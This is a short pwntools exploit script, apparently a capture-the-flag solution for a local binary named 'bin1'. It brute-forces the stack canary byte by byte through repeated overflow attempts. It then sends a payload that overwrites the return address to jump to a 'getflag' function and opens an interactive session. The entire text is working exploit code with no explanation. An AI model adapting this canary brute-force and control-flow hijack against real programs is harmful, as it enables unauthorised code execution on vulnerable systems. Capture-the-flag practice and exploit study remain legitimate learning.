from pwn import *
import time
#context.log_level = 'debug'
io = process("./bin1")
elf = ELF("./bin1")

canary = '\x00'

for k in range(3):
	for i in range(256):
		print "Checking %d for %d" % (i, k)
		payload = 'A'*100 + canary + p8(i)
		io.sendafter('welcome\n', payload)
		time.sleep(0.01)
		res = io.recv()
		if "sucess" in res:
			canary += p8(i)
			io.send('A'*108)
			break

print 'canary: %s' % hex(u32(canary))
payload = 'A'*100 + canary + 'B'*12 + p32(elf.symbols['getflag'])
io.send(payload)
print io.recv()
io.interactive()